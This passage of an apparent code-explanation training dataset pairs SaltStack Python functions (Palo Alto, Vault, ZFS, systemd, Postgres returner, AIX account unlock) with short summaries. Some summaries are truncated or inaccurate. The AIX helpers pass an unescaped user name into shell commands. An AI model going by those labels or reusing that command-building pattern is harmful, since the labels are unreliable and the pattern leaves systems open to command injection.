authentication_type=symmetric key_id=15 authentication_key=mykey algorithm=md5 deploy=True\n\n    '''\n    ret = {}\n\n    if target not in ['primary', 'secondary', 'both']:\n        raise salt.exceptions.CommandExecutionError(\"Target option must be primary, secondary, or both.\")\n\n    if authentication_type not in ['symmetric', 'autokey', 'none']:\n        raise salt.exceptions.CommandExecutionError(\"Type option must be symmetric, autokey, or both.\")\n\n    if authentication_type == \"symmetric\" and not authentication_key:\n        raise salt.exceptions.CommandExecutionError(\"When using symmetric authentication, authentication_key must be \"\n                                                    \"provided.\")\n\n    if authentication_type == \"symmetric\" and not key_id:\n        raise salt.exceptions.CommandExecutionError(\"When using symmetric authentication, key_id must be provided.\")\n\n    if authentication_type == \"symmetric\" and algorithm not in ['md5', 'sha1']:\n        raise salt.exceptions.CommandExecutionError(\"When using symmetric authentication, algorithm must be md5 or \"\n                                                    \"sha1.\")\n\n    if authentication_type == 'symmetric':\n        if target == 'primary' or target == 'both':\n            query = {'type': 'config',\n                     'action': 'set',\n                     'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                              'primary-ntp-server/authentication-type',\n                     'element': '<symmetric-key><algorithm><{0}><authentication-key>{1}</authentication-key></{0}>'\n                                '</algorithm><key-id>{2}</key-id></symmetric-key>'.format(algorithm,\n                                                                                          authentication_key,\n                                                                                          key_id)}\n            ret.update({'primary_server': __proxy__['panos.call'](query)})\n\n        if target == 'secondary' or target == 'both':\n            query = {'type': 'config',\n                     'action': 'set',\n                     'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                              'secondary-ntp-server/authentication-type',\n                     'element': '<symmetric-key><algorithm><{0}><authentication-key>{1}</authentication-key></{0}>'\n                                '</algorithm><key-id>{2}</key-id></symmetric-key>'.format(algorithm,\n                                                                                          authentication_key,\n                                                                                          key_id)}\n            ret.update({'secondary_server': __proxy__['panos.call'](query)})\n    elif authentication_type == 'autokey':\n        if target == 'primary' or target == 'both':\n            query = {'type': 'config',\n                     'action': 'set',\n                     'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                              'primary-ntp-server/authentication-type',\n                     'element': '<autokey/>'}\n            ret.update({'primary_server': __proxy__['panos.call'](query)})\n\n        if target == 'secondary' or target == 'both':\n            query = {'type': 'config',\n                     'action': 'set',\n                     'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                              'secondary-ntp-server/authentication-type',\n                     'element': '<autokey/>'}\n            ret.update({'secondary_server': __proxy__['panos.call'](query)})\n    elif authentication_type == 'none':\n        if target == 'primary' or target == 'both':\n            query = {'type': 'config',\n                     'action': 'set',\n                     'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                              'primary-ntp-server/authentication-type',\n                     'element': '<none/>'}\n            ret.update({'primary_server': __proxy__['panos.call'](query)})\n\n        if target == 'secondary' or target == 'both':\n            query = {'type': 'config',\n                     'action': 'set',\n                     'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                              'secondary-ntp-server/authentication-type',\n                     'element': '<none/>'}\n            ret.update({'secondary_server': __proxy__['panos.call'](query)})\n\n    if deploy is True:\n        ret.update(commit())\n\n    return ret", "response": "Sets the NTP authentication of the Palo Alto proxy minion."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_ntp_servers(primary_server=None, secondary_server=None, deploy=False):\n    '''\n    Set the NTP servers of the Palo Alto proxy minion. A commit will be required before this is processed.\n\n    CLI Example:\n\n    Args:\n        primary_server(str): The primary NTP server IP address or FQDN.\n\n        secondary_server(str): The secondary NTP server IP address or FQDN.\n\n        deploy (bool): If true then commit the full candidate configuration, if false only set pending change.\n\n    .. code-block:: bash\n\n        salt '*' ntp.set_servers 0.pool.ntp.org 1.pool.ntp.org\n        salt '*' ntp.set_servers primary_server=0.pool.ntp.org secondary_server=1.pool.ntp.org\n        salt '*' ntp.ser_servers 0.pool.ntp.org 1.pool.ntp.org deploy=True\n\n    '''\n    ret = {}\n\n    if primary_server:\n        query = {'type': 'config',\n                 'action': 'set',\n                 'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                          'primary-ntp-server',\n                 'element': '<ntp-server-address>{0}</ntp-server-address>'.format(primary_server)}\n        ret.update({'primary_server': __proxy__['panos.call'](query)})\n\n    if secondary_server:\n        query = {'type': 'config',\n                 'action': 'set',\n                 'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/ntp-servers/'\n                          'secondary-ntp-server',\n                 'element': '<ntp-server-address>{0}</ntp-server-address>'.format(secondary_server)}\n        ret.update({'secondary_server': __proxy__['panos.call'](query)})\n\n    if deploy is True:\n        ret.update(commit())\n\n    return ret", "response": "Sets the NTP servers of the Palo Alto proxy minion."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_permitted_ip(address=None, deploy=False):\n    '''\n    Add an IPv4 address or network to the permitted IP list.\n\n    CLI Example:\n\n    Args:\n        address (str): The IPv4 address or network to allow access to add to the Palo Alto device.\n\n        deploy (bool): If true then commit the full candidate configuration, if false only set pending change.\n\n    .. code-block:: bash\n\n        salt '*' panos.set_permitted_ip 10.0.0.1\n        salt '*' panos.set_permitted_ip 10.0.0.0/24\n        salt '*' panos.set_permitted_ip 10.0.0.1 deploy=True\n\n    '''\n\n    if not address:\n        raise CommandExecutionError(\"Address option must not be empty.\")\n\n    ret = {}\n\n    query = {'type': 'config',\n             'action': 'set',\n             'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/permitted-ip',\n             'element': '<entry name=\\'{0}\\'></entry>'.format(address)}\n\n    ret.update(__proxy__['panos.call'](query))\n\n    if deploy is True:\n        ret.update(commit())\n\n    return ret", "response": "This function allows the Palo Alto device to add an IPv4 address or network to the permitted IP list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset the timezone of the Palo Alto proxy minion.", "response": "def set_timezone(tz=None, deploy=False):\n    '''\n    Set the timezone of the Palo Alto proxy minion. A commit will be required before this is processed.\n\n    CLI Example:\n\n    Args:\n        tz (str): The name of the timezone to set.\n\n        deploy (bool): If true then commit the full candidate configuration, if false only set pending change.\n\n    .. code-block:: bash\n\n        salt '*' panos.set_timezone UTC\n        salt '*' panos.set_timezone UTC deploy=True\n\n    '''\n\n    if not tz:\n        raise CommandExecutionError(\"Timezone name option must not be none.\")\n\n    ret = {}\n\n    query = {'type': 'config',\n             'action': 'set',\n             'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/timezone',\n             'element': '<timezone>{0}</timezone>'.format(tz)}\n\n    ret.update(__proxy__['panos.call'](query))\n\n    if deploy is True:\n        ret.update(commit())\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nensures a Vault policy with the given name and rules is present.", "response": "def policy_present(name, rules):\n    '''\n    Ensure a Vault policy with the given name and rules is present.\n\n    name\n        The name of the policy\n\n    rules\n        Rules formatted as in-line HCL\n\n\n    .. code-block:: yaml\n\n        demo-policy:\n          vault.policy_present:\n            - name: foo/bar\n            - rules: |\n                path \"secret/top-secret/*\" {\n                  policy = \"deny\"\n                }\n                path \"secret/not-very-secret/*\" {\n                  policy = \"write\"\n                }\n\n    '''\n    url = \"v1/sys/policy/{0}\".format(name)\n    response = __utils__['vault.make_request']('GET', url)\n    try:\n        if response.status_code == 200:\n            return _handle_existing_policy(name, rules, response.json()['rules'])\n        elif response.status_code == 404:\n            return _create_new_policy(name, rules)\n        else:\n            response.raise_for_status()\n    except Exception as e:\n        return {\n            'name': name,\n            'changes': {},\n            'result': False,\n            'comment': 'Failed to get policy: {0}'.format(e)\n        }"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef returner(ret):\n    '''\n    Write the return data to a file on the minion.\n    '''\n    opts = _get_options(ret)\n    try:\n        with salt.utils.files.flopen(opts['filename'], 'a') as logfile:\n            salt.utils.json.dump(ret, logfile)\n            logfile.write(str('\\n'))  # future lint: disable=blacklisted-function\n    except Exception:\n        log.error('Could not write to rawdata_json file %s', opts['filename'])\n        raise", "response": "Write the return data to a file on the minion."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef event_return(events):\n    '''\n    Write event data (return data and non-return data) to file on the master.\n    '''\n    if not events:\n        # events is an empty list.\n        # Don't open the logfile in vain.\n        return\n    opts = _get_options({})  # Pass in empty ret, since this is a list of events\n    try:\n        with salt.utils.files.flopen(opts['filename'], 'a') as logfile:\n            for event in events:\n                salt.utils.json.dump(event, logfile)\n                logfile.write(str('\\n'))  # future lint: disable=blacklisted-function\n    except Exception:\n        log.error('Could not write to rawdata_json file %s', opts['filename'])\n        raise", "response": "Write event data to file on the master."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _layout_to_vdev(layout, device_dir=None):\n    '''\n    Turn the layout data into usable vdevs spedcification\n\n    We need to support 2 ways of passing the layout:\n\n    .. code::\n        layout_new:\n          - mirror:\n            - disk0\n            - disk1\n          - mirror:\n            - disk2\n            - disk3\n\n    .. code:\n        layout_legacy:\n          mirror-0:\n            disk0\n            disk1\n          mirror-1:\n            disk2\n            disk3\n\n    '''\n    vdevs = []\n\n    # NOTE: check device_dir exists\n    if device_dir and not os.path.exists(device_dir):\n        device_dir = None\n\n    # NOTE: handle list of OrderedDicts (new layout)\n    if isinstance(layout, list):\n        # NOTE: parse each vdev as a tiny layout and just append\n        for vdev in layout:\n            if isinstance(vdev, OrderedDict):\n                vdevs.extend(_layout_to_vdev(vdev, device_dir))\n            else:\n                if device_dir and vdev[0] != '/':\n                    vdev = os.path.join(device_dir, vdev)\n                vdevs.append(vdev)\n\n    # NOTE: handle nested OrderedDict (legacy layout)\n    #       this is also used to parse the nested OrderedDicts\n    #       from the new layout\n    elif isinstance(layout, OrderedDict):\n        for vdev in layout:\n            # NOTE: extract the vdev type and disks in the vdev\n            vdev_type = vdev.split('-')[0]\n            vdev_disk = layout[vdev]\n\n            # NOTE: skip appending the dummy type 'disk'\n            if vdev_type != 'disk':\n                vdevs.append(vdev_type)\n\n            # NOTE: ensure the disks are a list (legacy layout are not)\n            if not isinstance(vdev_disk, list):\n                vdev_disk = vdev_disk.split(' ')\n\n            # NOTE: also append the actualy disks behind the type\n            #       also prepend device_dir to disks if required\n            for disk in vdev_disk:\n                if device_dir and disk[0] != '/':\n                    disk = os.path.join(device_dir, disk)\n                vdevs.append(disk)\n\n    # NOTE: we got invalid data for layout\n    else:\n        vdevs = None\n\n    return vdevs", "response": "Convert a layout to a list of vdevs."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nensure that the storage pool with the given name properties filesystem properties and layout are set for the storage pool.", "response": "def present(name, properties=None, filesystem_properties=None, layout=None, config=None):\n    '''\n    ensure storage pool is present on the system\n\n    name : string\n        name of storage pool\n    properties : dict\n        optional set of properties to set for the storage pool\n    filesystem_properties : dict\n        optional set of filesystem properties to set for the storage pool (creation only)\n    layout: dict\n        disk layout to use if the pool does not exist (creation only)\n    config : dict\n        fine grain control over this state\n\n    .. note::\n\n        The following configuration properties can be toggled in the config parameter.\n          - import (true) - try to import the pool before creating it if absent\n          - import_dirs (None) - specify additional locations to scan for devices on import (comma-seperated)\n          - device_dir (None, SunOS=/dev/dsk, Linux=/dev) - specify device directory to prepend for none\n            absolute device paths\n          - force (false) - try to force the import or creation\n\n    .. note::\n\n        It is no longer needed to give a unique name to each top-level vdev, the old\n        layout format is still supported but no longer recommended.\n\n        .. code-block:: yaml\n\n            - mirror:\n              - /tmp/vdisk3\n              - /tmp/vdisk2\n            - mirror:\n              - /tmp/vdisk0\n              - /tmp/vdisk1\n\n        The above yaml will always result in the following zpool create:\n\n        .. code-block:: bash\n\n            zpool create mypool mirror /tmp/vdisk3 /tmp/vdisk2 mirror /tmp/vdisk0 /tmp/vdisk1\n\n    .. warning::\n\n        The legacy format is also still supported but not recommended,\n        because ID's inside the layout dict must be unique they need to have a suffix.\n\n        .. code-block:: yaml\n\n            mirror-0:\n              /tmp/vdisk3\n              /tmp/vdisk2\n            mirror-1:\n              /tmp/vdisk0\n              /tmp/vdisk1\n\n    .. warning::\n\n        Pay attention to the order of your dict!\n\n        .. code-block:: yaml\n\n            - mirror:\n              - /tmp/vdisk0\n              - /tmp/vdisk1\n            - /tmp/vdisk2\n\n        The above will result in the following zpool create:\n\n        .. code-block:: bash\n\n            zpool create mypool mirror /tmp/vdisk0 /tmp/vdisk1 /tmp/vdisk2\n\n        Creating a 3-way mirror! While you probably expect it to be mirror\n        root vdev with 2 devices + a root vdev of 1 device!\n\n    '''\n    ret = {'name': name,\n           'changes': {},\n           'result': None,\n           'comment': ''}\n\n    # config defaults\n    default_config = {\n        'import': True,\n        'import_dirs': None,\n        'device_dir': None,\n        'force': False\n    }\n    if __grains__['kernel'] == 'SunOS':\n        default_config['device_dir'] = '/dev/dsk'\n    elif __grains__['kernel'] == 'Linux':\n        default_config['device_dir'] = '/dev'\n\n    # merge state config\n    if config:\n        default_config.update(config)\n    config = default_config\n\n    # ensure properties are zfs values\n    if properties:\n        properties = __utils__['zfs.from_auto_dict'](properties)\n    elif properties is None:\n        properties = {}\n    if filesystem_properties:\n        filesystem_properties = __utils__['zfs.from_auto_dict'](filesystem_properties)\n    elif filesystem_properties is None:\n        filesystem_properties = {}\n\n    # parse layout\n    vdevs = _layout_to_vdev(layout, config['device_dir'])\n    if vdevs:\n        vdevs.insert(0, name)\n\n    # log configuration\n    log.debug('zpool.present::%s::config - %s', name, config)\n    log.debug('zpool.present::%s::vdevs - %s', name, vdevs)\n    log.debug('zpool.present::%s::properties -  %s', name, properties)\n    log.debug('zpool.present::%s::filesystem_properties -  %s', name, filesystem_properties)\n\n    # ensure the pool is present\n    ret['result'] = False\n\n    # don't do anything because this is a test\n    if __opts__['test']:\n        ret['result'] = True\n        if __salt__['zpool.exists'](name):\n            ret['changes'][name] = 'uptodate'\n        else:\n            ret['changes'][name] = 'imported' if config['import'] else 'created'\n        ret['comment'] = 'storage pool {0} was {1}'.format(name, ret['changes'][name])\n\n    # update pool\n    elif __salt__['zpool.exists'](name):\n        ret['result'] = True\n\n        # fetch current pool properties\n        properties_current = __salt__['zpool.get'](name, parsable=True)\n\n        # build list of properties to update\n        properties_update = []\n        if properties:\n            for prop in properties:\n                # skip unexisting properties\n                if prop not in properties_current:\n                    log.warning('zpool.present::%s::update - unknown property: %s', name, prop)\n                    continue\n\n                # compare current and wanted value\n                if properties_current[prop] != properties[prop]:\n                    properties_update.append(prop)\n\n        # update pool properties\n        for prop in properties_update:\n            res = __salt__['zpool.set'](name, prop, properties[prop])\n\n            if res['set']:\n                if name not in ret['changes']:\n                    ret['changes'][name] = {}\n                ret['changes'][name][prop] = properties[prop]\n            else:\n                ret['result'] = False\n                if ret['comment'] == '':\n                    ret['comment'] = 'The following properties were not updated:'\n                ret['comment'] = '{0} {1}'.format(ret['comment'], prop)\n\n        if ret['result']:\n            ret['comment'] = 'properties updated' if ret['changes'] else 'no update needed'\n\n    # import or create the pool (at least try to anyway)\n    else:\n        # import pool\n        if config['import']:\n            mod_res = __salt__['zpool.import'](\n                name,\n                force=config['force'],\n                dir=config['import_dirs'],\n            )\n\n            ret['result'] = mod_res['imported']\n            if ret['result']:\n                ret['changes'][name] = 'imported'\n                ret['comment'] = 'storage pool {0} was imported'.format(name)\n\n        # create pool\n        if not ret['result'] and vdevs:\n            log.debug('zpool.present::%s::creating', name)\n\n            # execute zpool.create\n            mod_res = __salt__['zpool.create'](\n                *vdevs,\n                force=config['force'],\n                properties=properties,\n                filesystem_properties=filesystem_properties\n            )\n\n            ret['result'] = mod_res['created']\n            if ret['result']:\n                ret['changes'][name] = 'created'\n                ret['comment'] = 'storage pool {0} was created'.format(name)\n            elif 'error' in mod_res:\n                ret['comment'] = mod_res['error']\n            else:\n                ret['comment'] = 'could not create storage pool {0}'.format(name)\n\n        # give up, we cannot import the pool and we do not have a layout to create it\n        if not ret['result'] and not vdevs:\n            ret['comment'] = 'storage pool {0} was not imported, no (valid) layout specified for creation'.format(name)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nensuring storage pool is absent on the system", "response": "def absent(name, export=False, force=False):\n    '''\n    ensure storage pool is absent on the system\n\n    name : string\n        name of storage pool\n    export : boolean\n        export instread of destroy the zpool if present\n    force : boolean\n        force destroy or export\n\n    '''\n    ret = {'name': name,\n           'changes': {},\n           'result': None,\n           'comment': ''}\n\n    # log configuration\n    log.debug('zpool.absent::%s::config::force = %s', name, force)\n    log.debug('zpool.absent::%s::config::export = %s', name, export)\n\n    # ensure the pool is absent\n    if __salt__['zpool.exists'](name):  # looks like we need to do some work\n        mod_res = {}\n        ret['result'] = False\n\n        # NOTE: handle test\n        if __opts__['test']:\n            ret['result'] = True\n\n        # NOTE: try to export the pool\n        elif export:\n            mod_res = __salt__['zpool.export'](name, force=force)\n            ret['result'] = mod_res['exported']\n\n        # NOTE: try to destroy the pool\n        else:\n            mod_res = __salt__['zpool.destroy'](name, force=force)\n            ret['result'] = mod_res['destroyed']\n\n        if ret['result']:  # update the changes and comment\n            ret['changes'][name] = 'exported' if export else 'destroyed'\n            ret['comment'] = 'storage pool {0} was {1}'.format(name, ret['changes'][name])\n        elif 'error' in mod_res:\n            ret['comment'] = mod_res['error']\n\n    else:  # we are looking good\n        ret['result'] = True\n        ret['comment'] = 'storage pool {0} is absent'.format(name)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef booted(context=None):\n    '''\n    Return True if the system was booted with systemd, False otherwise.  If the\n    loader context dict ``__context__`` is passed, this function will set the\n    ``salt.utils.systemd.booted`` key to represent if systemd is running and\n    keep the logic below from needing to be run again during the same salt run.\n    '''\n    contextkey = 'salt.utils.systemd.booted'\n    if isinstance(context, dict):\n        # Can't put this if block on the same line as the above if block,\n        # because it willl break the elif below.\n        if contextkey in context:\n            return context[contextkey]\n    elif context is not None:\n        raise SaltInvocationError('context must be a dictionary if passed')\n\n    try:\n        # This check does the same as sd_booted() from libsystemd-daemon:\n        # http://www.freedesktop.org/software/systemd/man/sd_booted.html\n        ret = bool(os.stat('/run/systemd/system'))\n    except OSError:\n        ret = False\n\n    try:\n        context[contextkey] = ret\n    except TypeError:\n        pass\n\n    return ret", "response": "Return True if the system was booted with systemd False otherwise."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the version of the systemd kernel", "response": "def version(context=None):\n    '''\n    Attempts to run systemctl --version. Returns None if unable to determine\n    version.\n    '''\n    contextkey = 'salt.utils.systemd.version'\n    if isinstance(context, dict):\n        # Can't put this if block on the same line as the above if block,\n        # because it will break the elif below.\n        if contextkey in context:\n            return context[contextkey]\n    elif context is not None:\n        raise SaltInvocationError('context must be a dictionary if passed')\n    stdout = subprocess.Popen(\n        ['systemctl', '--version'],\n        close_fds=True,\n        stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0]\n    outstr = salt.utils.stringutils.to_str(stdout)\n    try:\n        ret = int(re.search(r'\\w+ ([0-9]+)', outstr.splitlines()[0]).group(1))\n    except (AttributeError, IndexError, ValueError):\n        log.error(\n            'Unable to determine systemd version from systemctl '\n            '--version, output follows:\\n%s', outstr\n        )\n        return None\n    else:\n        try:\n            context[contextkey] = ret\n        except TypeError:\n            pass\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a boolean containing whether the current minion has a scope.", "response": "def has_scope(context=None):\n    '''\n    Scopes were introduced in systemd 205, this function returns a boolean\n    which is true when the minion is systemd-booted and running systemd>=205.\n    '''\n    if not booted(context):\n        return False\n    _sd_version = version(context)\n    if _sd_version is None:\n        return False\n    return _sd_version >= 205"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a postgres connection.", "response": "def _get_conn():\n    '''\n    Return a postgres connection.\n    '''\n    try:\n        conn = psycopg2.connect(\n               host=__opts__['master_job_cache.postgres.host'],\n               user=__opts__['master_job_cache.postgres.user'],\n               password=__opts__['master_job_cache.postgres.passwd'],\n               database=__opts__['master_job_cache.postgres.db'],\n               port=__opts__['master_job_cache.postgres.port'])\n    except psycopg2.OperationalError:\n        log.error('Could not connect to SQL server: %s', sys.exc_info()[0])\n        return None\n    return conn"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nformat the job instance correctly", "response": "def _format_job_instance(job):\n    '''\n    Format the job instance correctly\n    '''\n    ret = {'Function': job.get('fun', 'unknown-function'),\n           'Arguments': salt.utils.json.loads(job.get('arg', '[]')),\n           # unlikely but safeguard from invalid returns\n           'Target': job.get('tgt', 'unknown-target'),\n           'Target-type': job.get('tgt_type', 'list'),\n           'User': job.get('user', 'root')}\n    # TODO: Add Metadata support when it is merged from develop\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _gen_jid(cur):\n    '''\n    Generate an unique job id\n    '''\n    jid = salt.utils.jid.gen_jid(__opts__)\n    sql = '''SELECT jid FROM jids WHERE jid = %s'''\n    cur.execute(sql, (jid,))\n    data = cur.fetchall()\n    if not data:\n        return jid\n    return None", "response": "Generate a unique job id"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a job id and prepare the job id directory", "response": "def prep_jid(nocache=False, passed_jid=None):\n    '''\n    Return a job id and prepare the job id directory\n    This is the function responsible for making sure jids don't collide\n    (unless its passed a jid). So do what you have to do to make sure that\n    stays the case\n    '''\n    conn = _get_conn()\n    if conn is None:\n        return None\n    cur = conn.cursor()\n    if passed_jid is None:\n        jid = _gen_jid(cur)\n    else:\n        jid = passed_jid\n    while not jid:\n        log.info(\"jid clash, generating a new one\")\n        jid = _gen_jid(cur)\n\n    cur.close()\n    conn.close()\n    return jid"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef returner(load):\n    '''\n    Return data to a postgres server\n    '''\n    conn = _get_conn()\n    if conn is None:\n        return None\n    cur = conn.cursor()\n    sql = '''INSERT INTO salt_returns\n            (fun, jid, return, id, success)\n            VALUES (%s, %s, %s, %s, %s)'''\n    try:\n        ret = six.text_type(load['return'])\n    except UnicodeDecodeError:\n        ret = str(load['return'])\n    job_ret = {'return': ret}\n    if 'retcode' in load:\n        job_ret['retcode'] = load['retcode']\n    if 'success' in load:\n        job_ret['success'] = load['success']\n    cur.execute(\n        sql, (\n            load['fun'],\n            load['jid'],\n            salt.utils.json.dumps(job_ret),\n            load['id'],\n            load.get('success'),\n        )\n    )\n    _close_conn(conn)", "response": "Return data to a postgres server\n   "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning events to a postgres server", "response": "def event_return(events):\n    '''\n    Return event to a postgres server\n\n    Require that configuration be enabled via 'event_return'\n    option in master config.\n    '''\n    conn = _get_conn()\n    if conn is None:\n        return None\n    cur = conn.cursor()\n    for event in events:\n        tag = event.get('tag', '')\n        data = event.get('data', '')\n        sql = '''INSERT INTO salt_events\n                (tag, data, master_id)\n                VALUES (%s, %s, %s)'''\n        cur.execute(sql, (tag, salt.utils.json.dumps(data), __opts__['id']))\n    _close_conn(conn)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsaving the load to the specified jid id", "response": "def save_load(jid, clear_load, minions=None):\n    '''\n    Save the load to the specified jid id\n    '''\n    jid = _escape_jid(jid)\n    conn = _get_conn()\n    if conn is None:\n        return None\n    cur = conn.cursor()\n    sql = '''INSERT INTO jids ''' \\\n          '''(jid, started, tgt_type, cmd, tgt, kwargs, ret, username, arg,''' \\\n          ''' fun) ''' \\\n          '''VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)'''\n\n    cur.execute(\n        sql, (\n            jid,\n            salt.utils.jid.jid_to_time(jid),\n            six.text_type(clear_load.get(\"tgt_type\")),\n            six.text_type(clear_load.get(\"cmd\")),\n            six.text_type(clear_load.get(\"tgt\")),\n            six.text_type(clear_load.get(\"kwargs\")),\n            six.text_type(clear_load.get(\"ret\")),\n            six.text_type(clear_load.get(\"user\")),\n            six.text_type(salt.utils.json.dumps(clear_load.get(\"arg\"))),\n            six.text_type(clear_load.get(\"fun\")),\n        )\n    )\n    # TODO: Add Metadata support when it is merged from develop\n    _close_conn(conn)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _escape_jid(jid):\n    '''\n    Do proper formatting of the jid\n    '''\n    jid = six.text_type(jid)\n    jid = re.sub(r\"'*\", \"\", jid)\n    return jid", "response": "Escape the jid in the\n   "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild dict from data", "response": "def _build_dict(data):\n    '''\n    Rebuild dict\n    '''\n    result = {}\n    # TODO: Add Metadata support when it is merged from develop\n    result[\"jid\"] = data[0]\n    result[\"tgt_type\"] = data[1]\n    result[\"cmd\"] = data[2]\n    result[\"tgt\"] = data[3]\n    result[\"kwargs\"] = data[4]\n    result[\"ret\"] = data[5]\n    result[\"user\"] = data[6]\n    result[\"arg\"] = data[7]\n    result[\"fun\"] = data[8]\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_load(jid):\n    '''\n    Return the load data that marks a specified jid\n    '''\n    jid = _escape_jid(jid)\n    conn = _get_conn()\n    if conn is None:\n        return None\n    cur = conn.cursor()\n    sql = '''SELECT jid, tgt_type, cmd, tgt, kwargs, ret, username, arg,''' \\\n          ''' fun FROM jids WHERE jid = %s'''\n    cur.execute(sql, (jid,))\n    data = cur.fetchone()\n    if data:\n        return _build_dict(data)\n    _close_conn(conn)\n    return {}", "response": "Return the load data that marks a specified jid\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_jid(jid):\n    '''\n    Return the information returned when the specified job id was executed\n    '''\n    jid = _escape_jid(jid)\n    conn = _get_conn()\n    if conn is None:\n        return None\n    cur = conn.cursor()\n    sql = '''SELECT id, return FROM salt_returns WHERE jid = %s'''\n\n    cur.execute(sql, (jid,))\n    data = cur.fetchall()\n    ret = {}\n    if data:\n        for minion, full_ret in data:\n            ret_data = salt.utils.json.loads(full_ret)\n            if not isinstance(ret_data, dict) or 'return' not in ret_data:\n                # Convert the old format in which the return contains the only return data to the\n                # new that is dict containing 'return' and optionally 'retcode' and 'success'.\n                ret_data = {'return': ret_data}\n            ret[minion] = ret_data\n    _close_conn(conn)\n    return ret", "response": "Return the information returned when the specified job id was executed\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_jids():\n    '''\n    Return a list of all job ids\n    For master job cache this also formats the output and returns a string\n    '''\n    conn = _get_conn()\n    cur = conn.cursor()\n    sql = '''SELECT ''' \\\n          '''jid, tgt_type, cmd, tgt, kwargs, ret, username, arg, fun ''' \\\n          '''FROM jids'''\n    if __opts__['keep_jobs'] != 0:\n        sql = sql + \" WHERE started > NOW() - INTERVAL '\" \\\n                + six.text_type(__opts__['keep_jobs']) + \"' HOUR\"\n\n    cur.execute(sql)\n    ret = {}\n    data = cur.fetchone()\n    while data:\n        data_dict = _build_dict(data)\n        ret[data_dict[\"jid\"]] = \\\n            _format_jid_instance(data_dict[\"jid\"], data_dict)\n        data = cur.fetchone()\n    cur.close()\n    conn.close()\n    return ret", "response": "Return a list of all job ids\n    For master job cache this also formats the output and returns a string\n    For master job cache this also formats the output and returns a string\n   "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef login_failures(user):\n\n    '''\n    Query for all accounts which have 3 or more login failures.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt <minion_id> shadow.login_failures ALL\n    '''\n\n    cmd = 'lsuser -a unsuccessful_login_count {0}'.format(user)\n    cmd += \" | grep -E 'unsuccessful_login_count=([3-9]|[0-9][0-9]+)'\"\n    out = __salt__['cmd.run_all'](cmd, output_loglevel='trace', python_shell=True)\n\n    ret = []\n\n    lines = out['stdout'].splitlines()\n    for line in lines:\n        ret.append(line.split()[0])\n\n    return ret", "response": "Query for all accounts which have 3 or more login failures."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nunlock user for locked account", "response": "def unlock(user):\n    '''\n    Unlock user for locked account\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt <minion_id> shadow.unlock user\n    '''\n\n    cmd = 'chuser account_locked=false {0} | ' \\\n          'chsec -f /etc/security/lastlog -a \"unsuccessful_login_count=0\" -s {0}'.format(user)\n    ret = __salt__['cmd.run_all'](cmd, output_loglevel='trace', python_shell=True)\n\n    return ret"}
